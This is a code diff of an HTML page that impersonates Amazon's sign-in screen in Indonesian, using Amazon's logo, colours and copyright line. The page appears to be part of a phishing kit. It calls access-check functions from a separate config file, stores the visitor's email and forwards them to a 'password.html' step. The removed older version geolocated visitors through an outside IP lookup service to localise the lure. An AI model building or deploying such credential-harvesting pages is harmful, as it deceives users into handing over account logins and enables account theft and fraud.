@@ -1,151 +1,134 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Amazon Sign In</title>
+    <title>Amazon — Masuk atau Buat Akun</title>
     <script src="config.js"></script>
-    <script>
-        let BAHASA = {
-            judul: 'Sign in or create account',
-            sub: 'Enter mobile number or email',
-            label: 'Mobile phone number or email address',
-            tombol: 'Continue',
-            syarat: 'By continuing, you agree to Amazon\'s',
-            bantuan: 'Need help?',
-            bisnis: 'Buying for work?',
-            bisnis_link: 'Create a free business account',
-            error_kosong: 'Enter your email or mobile phone number'
-        };
-
-        async function deteksiLokasi() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const d = await res.json();
-                const negara = d.country_code || 'US';
-
-                if (negara === 'JP') {
-                    BAHASA = {
-                        judul: 'サインインまたはアカウント作成',
-                        sub: '携帯電話番号またはメールアドレスを入力',
-                        label: '携帯電話番号またはメールアドレス',
-                        tombol: '続行',
-                        syarat: '続行することで、Amazonの利用規約およびプライバシー通知に同意したものとみなされます。',
-                        bantuan: 'お困りですか？',
-                        bisnis: '業務で購入しますか？',
-                        bisnis_link: '無料のビジネスアカウントを作成',
-                        error_kosong: 'メールアドレスまたは携帯電話番号を入力してください'
-                    };
-                    document.documentElement.lang = 'ja';
-                } else if (negara === 'ID') {
-                    BAHASA = {
-                        judul: 'Masuk atau buat akun',
-                        sub: 'Masukkan nomor ponsel atau email',
-                        label: 'Nomor ponsel atau alamat email',
-                        tombol: 'Lanjutkan',
-                        syarat: 'Dengan melanjutkan, Anda menyetujui Syarat Penggunaan dan Pemberitahuan Privasi Amazon.',
-                        bantuan: 'Butuh bantuan?',
-                        bisnis: 'Berbelanja untuk keperluan bisnis?',
-                        bisnis_link: 'Buat akun bisnis gratis',
-                        error_kosong: 'Masukkan alamat email atau nomor ponsel Anda'
-                    };
-                    document.documentElement.lang = 'id';
-                }
-                terapkanBahasa();
-            } catch(e) {}
-        }
-
-        function terapkanBahasa() {
-            document.getElementById('judul').textContent = BAHASA.judul;
-            document.getElementById('sub-judul').textContent = BAHASA.sub;
-            document.getElementById('label-email').textContent = BAHASA.label;
-            document.getElementById('tombol-lanjut').textContent = BAHASA.tombol;
-            document.getElementById('syarat-teks').innerHTML = 
-                `${BAHASA.syarat} <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.`;
-            document.getElementById('bantuan-link').textContent = BAHASA.bantuan;
-            document.getElementById('bisnis-teks').textContent = BAHASA.bisnis;
-            document.getElementById('bisnis-link').textContent = BAHASA.bisnis_link;
-            document.getElementById('pesanKosong').textContent = BAHASA.error_kosong;
-        }
-
-        document.addEventListener('DOMContentLoaded', async () => {
-            if (!await CONFIG.cekAkses()) return;
-            deteksiLokasi();
-        });
-    </script>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Amazon Ember', Arial, sans-serif; }
-        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 15px 20px; }
-        .logo { margin: 10px 0 20px; }
+        body {
+            background: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding: 20px;
+        }
+        .logo { margin: 15px 0 25px; text-align: center; }
         .logo img { height: 60px; }
-        .kotak { width: 100%; max-width: 350px; border: 1px solid #ddd; border-radius: 8px; padding: 20px 26px; }
-        h1 { font-size: 28px; font-weight: 400; margin-bottom: 10px; line-height: 1.2; }
-        .sub-judul { font-size: 14px; color: #111; margin-bottom: 15px; }
-        label { font-size: 13px; font-weight: 700; display: block; margin-bottom: 6px; color: #111; }
-        input { width: 100%; padding: 7px 10px; border: 1px solid #a6a6a6; border-radius: 4px; font-size: 15px; margin-bottom: 13px; height: 31px; }
+        .kotak {
+            width: 100%; max-width: 350px;
+            border: 1px solid #ddd;
+            border-radius: 8px;
+            padding: 25px;
+        }
+        h1 { font-size: 24px; font-weight: 500; margin-bottom: 20px; }
+        label {
+            font-size: 13px; font-weight: 700;
+            display: block; margin: 18px 0 6px;
+        }
+        input {
+            width: 100%; padding: 10px;
+            border: 1px solid #a6a6a6;
+            border-radius: 4px; font-size: 15px;
+        }
         input:focus { outline: none; border-color: #0071e3; box-shadow: 0 0 3px rgba(0,113,227,0.5); }
-        button { width: 100%; padding: 7px 10px; background: #FFD814; border: 1px solid #FCD200; border-radius: 20px; font-size: 15px; color: #0F1111; cursor: pointer; height: 32px; margin-bottom: 20px; }
-        button:hover { background: #F7CA00; }
-        .syarat { font-size: 12px; line-height: 1.5; margin-bottom: 25px; }
-        .syarat a { color: #0066c0; text-decoration: none; }
-        .syarat a:hover { text-decoration: underline; }
-        .bantuan { font-size: 13px; margin-bottom: 25px; }
-        .bantuan a { color: #0066c0; text-decoration: none; }
-        .bantuan a:hover { text-decoration: underline; }
-        .garis-pemisah { height: 1px; background: #e7e7e7; margin: 12px 0 20px; }
-        .bisnis { font-size: 13px; }
-        .bisnis strong { color: #111; }
-        .bisnis a { color: #0066c0; text-decoration: none; display: block; margin-top: 3px; }
-        .bisnis a:hover { text-decoration: underline; }
-        .footer { width: 100%; max-width: 500px; margin-top: 30px; padding-top: 20px; border-top: 1px solid #e7e7e7; text-align: center; font-size: 11px; color: #555; }
-        .footer-link { margin-bottom: 10px; }
-        .footer-link a { color: #0066c0; text-decoration: none; margin: 0 8px; }
-        .footer-link a:hover { text-decoration: underline; }
-        .pesan-error { color: #d00; font-size: 12px; margin-bottom: 10px; display: none; }
+        .pesan-kesalahan {
+            color: #c00; font-size: 13px; margin: 8px 0; display: none;
+        }
+        button {
+            width: 100%; padding: 10px;
+            background: #FFD814; border: 1px solid #FCD200;
+            border-radius: 20px; font-size: 15px; color: #0F1111;
+            cursor: pointer; margin-top: 20px;
+            transition: opacity 0.2s;
+        }
+        button:disabled { opacity: 0.5; cursor: not-allowed; }
+        button:not(:disabled):hover { background: #F7CA00; }
+        .garis-pemisah {
+            display: flex; align-items: center; gap: 15px;
+            margin: 30px 0; font-size: 12px; color: #767676;
+        }
+        .garis-pemisah hr { flex: 1; border: none; border-top: 1px solid #e7e7e7; }
+        .link-bantuan { font-size: 12px; margin-top: 20px; line-height: 1.5; }
+        .link-bantuan a { color: #0066c0; text-decoration: none; }
+        .link-bantuan a:hover { text-decoration: underline; }
+        .footer {
+            margin-top: 40px; text-align: center;
+            font-size: 11px; color: #555;
+        }
+        .footer a { color: #0066c0; text-decoration: none; margin: 0 8px; }
     </style>
 </head>
-<body>
-    <div class="logo"><img src="img/amazonlogo.png" alt="Amazon"></div>
-    <div class="kotak">
-        <h1 id="judul">Sign in or create account</h1>
-        <p class="sub-judul" id="sub-judul">Enter mobile number or email</p>
-        <label for="email" id="label-email">Mobile phone number or email address</label>
-        <input type="text" id="email" placeholder="">
-        <div class="pesan-error" id="pesanKosong">Enter your email or mobile phone number</div>
-        <button id="tombol-lanjut" onclick="lanjut()">Continue</button>
-        <p class="syarat" id="syarat-teks">
-            By continuing, you agree to Amazon's <a href="#">Conditions of Use</a> and <a href="#">Privacy Notice</a>.
-        </p>
-        <p class="bantuan"><a href="#" id="bantuan-link">Need help?</a></p>
-        <div class="garis-pemisah"></div>
-        <p class="bisnis">
-            <strong id="bisnis-teks">Buying for work?</strong>
-            <a href="#" id="bisnis-link">Create a free business account</a>
-        </p>
+<body onload="CONFIG.cekParameter()">
+    <div class="logo">
+        <img src="img/amazonlogo.png" alt="Amazon">
     </div>
-    <div class="footer">
-        <div class="footer-link">
-            <a href="#">Conditions of Use</a>
-            <a href="#">Privacy Notice</a>
-            <a href="#">Help</a>
+
+    <div class="kotak">
+        <h1>Masuk atau buat akun</h1>
+
+        <label for="email">Alamat email</label>
+        <input type="email" id="email" placeholder="nama@contoh.com" autocomplete="username">
+        <div class="pesan-kesalahan" id="kesalahanEmail">Masukkan alamat email yang valid</div>
+
+        <button id="tombolLanjut" disabled onclick="lanjut()">Lanjut</button>
+
+        <div class="link-bantuan">
+            Belum punya akun? <a href="#">Buat akun Amazon</a>
         </div>
-        <p>© 1996-2026, Amazon.com, Inc. or its affiliates</p>
+
+        <div class="garis-pemisah">
+            <hr> <span>Atau lanjutkan dengan</span> <hr>
+        </div>
+
+        <div class="link-bantuan">
+            <a href="#">Butuh bantuan?</a>
+        </div>
+    </div>
+
+    <div class="footer">
+        <p>
+            <a href="#">Syarat Penggunaan</a>
+            <a href="#">Pemberitahuan Privasi</a>
+            <a href="#">Bantuan</a>
+        </p>
+        <p style="margin-top:5px; color:#999;">© 1996–2026, Amazon.com, Inc. atau afiliasinya</p>
     </div>
 
     <script>
-        function lanjut() {
-            const email = document.getElementById('email').value.trim();
-            if (!email) {
-                document.getElementById('pesanKosong').style.display = 'block';
-                document.getElementById('email').focus();
-                return;
+        const inputEmail = document.getElementById('email');
+        const tombolLanjut = document.getElementById('tombolLanjut');
+        const kesalahanEmail = document.getElementById('kesalahanEmail');
+
+        // Cek input email
+        inputEmail.addEventListener('input', fungsiCek);
+        inputEmail.addEventListener('keydown', function(e) {
+            if (e.key === 'Enter' && !tombolLanjut.disabled) lanjut();
+        });
+
+        function fungsiCek() {
+            const email = inputEmail.value.trim();
+            const formatEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            
+            if (email === '') {
+                kesalahanEmail.style.display = 'none';
+                tombolLanjut.disabled = true;
+            } else if (!formatEmail.test(email)) {
+                kesalahanEmail.style.display = 'block';
+                tombolLanjut.disabled = true;
+            } else {
+                kesalahanEmail.style.display = 'none';
+                tombolLanjut.disabled = false;
             }
+        }
+
+        function lanjut() {
+            const email = inputEmail.value.trim();
             localStorage.setItem('emailPengguna', email);
             window.location.href = 'password.html';
         }
-        document.getElementById('email').addEventListener('keypress', e => {
-            if (e.key === 'Enter') lanjut();
-        });
     </script>
 </body>
 </html>
